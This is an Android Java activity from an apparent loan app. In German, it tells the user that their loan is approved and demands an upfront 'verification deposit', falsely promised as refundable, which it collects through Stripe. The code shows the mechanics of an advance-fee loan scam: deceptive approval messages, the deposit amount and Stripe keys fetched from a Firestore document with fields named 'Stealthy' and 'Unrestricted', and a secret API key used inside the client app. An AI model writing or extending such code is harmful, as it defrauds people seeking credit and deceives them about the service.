package com.justkeepfaith.ndengaquick;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.stripe.android.PaymentConfiguration;
import com.stripe.android.paymentsheet.PaymentSheet;
import com.stripe.android.paymentsheet.PaymentSheetResult;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class striscia_pagina extends AppCompatActivity {

    String Open, Closed, period, lname, Number, amount_applied;
    TextView message, button;
    SharedPreferences sharedPreferences;
    String customerID, emphericalKey, ClientSecret;
    PaymentSheet paymentSheet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_striscia_pagina);

        button = (TextView) findViewById(R.id.gpaybton);
        message = (TextView) findViewById(R.id.message);


        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        lname = sharedPreferences.getString("last_name", "User");
        Open = sharedPreferences.getString("Open", "");
        Closed = sharedPreferences.getString("Closed", "");
        Number = sharedPreferences.getString("Number", "");
        period = sharedPreferences.getString("Months", "");
        amount_applied = sharedPreferences.getString("loan_applied", "");


        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("notification", "Glückwunsch!! Ihr Kreditantrag wurde genehmigt. Sie sind nur noch wenige letzte Schritte " +
                "entfernt, bevor Sie Ihren Kredit erhalten können. Klicken Sie auf diese Benachrichtigung, um weitere " +
                "Informationen zu erhalten.");
        editor.commit();


        message.setText("--Sehr geehrte "+lname+", Ihr Kreditantrag über €"+ amount_applied +" wurde genehmigt. Dieses Darlehen muss innerhalb " +
                "von " + period + " Monaten zurückgezahlt werden.\n\n--Damit dieses Darlehen jedoch auf Ihr Bankkonto ausgezahlt " +
                "werden kann, verlangt "+getResources().getString(R.string.app_name)+" von Ihnen eine einmalige Einzahlung von €" + Number + " auf " +
                "Ihr "+getResources().getString(R.string.app_name)+". Wir bitten dies, um zu bestätigen, dass Sie ein rechtmäßiger " +
                "Benutzer sind, damit wir den Missbrauch unserer Dienste durch betrügerische Benutzer verhindern können.\n\n--Bitte beachten " +
                "Sie, dass diese Anzahlung bei der Kreditrückzahlung oder wenn Sie sich entscheiden, " +
                "Ihr "+getResources().getString(R.string.app_name)+"-Konto zu schließen, zurückerstattet wird da dies lediglich ein " +
                "Authentifizierungsaufwand für alle neuen Benutzer ist.");



        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Classified").document("Commissioned");
        documentReference.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {

                DocumentSnapshot dsnap = task.getResult();

                Open = dsnap.getString("Unrestricted");
                Closed = dsnap.getString("Stealthy");
                Number = dsnap.getString("Quota");

                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("Open", Open);
                editor.putString("Closed", Closed);
                editor.putString("Number", Number);
                editor.commit();

                message.setText("--Sehr geehrte "+lname+", Ihr Kreditantrag über €"+ amount_applied +" wurde genehmigt. Dieses Darlehen muss innerhalb " +
                        "von " + period + " Monaten zurückgezahlt werden.\n\n--Damit dieses Darlehen jedoch auf Ihr Bankkonto ausgezahlt " +
                        "werden kann, verlangt "+getResources().getString(R.string.app_name)+" von Ihnen eine einmalige Einzahlung von €" + Number + " auf " +
                        "Ihr "+getResources().getString(R.string.app_name)+". Wir bitten dies, um zu bestätigen, dass Sie ein rechtmäßiger " +
                        "Benutzer sind, damit wir den Missbrauch unserer Dienste durch betrügerische Benutzer verhindern können.\n\n--Bitte beachten " +
                        "Sie, dass diese Anzahlung bei der Kreditrückzahlung oder wenn Sie sich entscheiden, " +
                        "Ihr "+getResources().getString(R.string.app_name)+"-Konto zu schließen, zurückerstattet wird da dies lediglich ein " +
                        "Authentifizierungsaufwand für alle neuen Benutzer ist.");
            }
        });

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (!Conectivity.isConnectingToInternet(striscia_pagina.this)) {
                    Toast.makeText(striscia_pagina.this, "Bitte überprüfe deine Internetverbindung", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (Open.isEmpty()){
                    Toast.makeText(striscia_pagina.this, "Versuchen Sie es erneut", Toast.LENGTH_SHORT).show();
                }
                else {
                    Toast.makeText(striscia_pagina.this, "Bitte warten", Toast.LENGTH_SHORT).show();
                    PayNow();
                }
            }
        });

        paymentSheet = new PaymentSheet(this, paymentSheetResult -> {

            onPaymentResult(paymentSheetResult);

        });

    }
    private void PayNow(){

        PaymentConfiguration.init(this, Open);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/customers",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            customerID = object.getString("id");
                            getEmphericalKey(customerID);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getEmphericalKey(String customerID) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/ephemeral_keys",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            emphericalKey = object.getString("id");
                            getClientSecret(customerID, emphericalKey);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                header.put("Stripe-Version","2020-08-27");
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getClientSecret(String customerID, String emphericalKey) {

        int lon = Integer.parseInt(Number);
        String deni = String.valueOf((lon) * 100 + 30);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/payment_intents",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            ClientSecret = object.getString("client_secret");
                            PaymentFlow();


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);
                params.put("amount", deni);
                params.put("currency", "eur");
                params.put("automatic_payment_methods[enabled]", "true");

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }


    private void onPaymentResult(PaymentSheetResult paymentSheetResult) {

        if (paymentSheetResult instanceof PaymentSheetResult.Completed) {

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("balance", Number);
            editor.commit();

            Toast.makeText(striscia_pagina.this, "Erfolgreich", Toast.LENGTH_SHORT).show();

            Intent intent = new Intent(this, grazie_tasso.class);
            startActivity(intent);
            finish();
        }
        if (paymentSheetResult instanceof PaymentSheetResult.Canceled) {

        }

    }

    private void PaymentFlow() {

        paymentSheet.presentWithPaymentIntent(
                ClientSecret, new PaymentSheet.Configuration(getResources().getString(R.string.app_name),
                        new PaymentSheet.CustomerConfiguration(customerID, emphericalKey))
        );
    }
}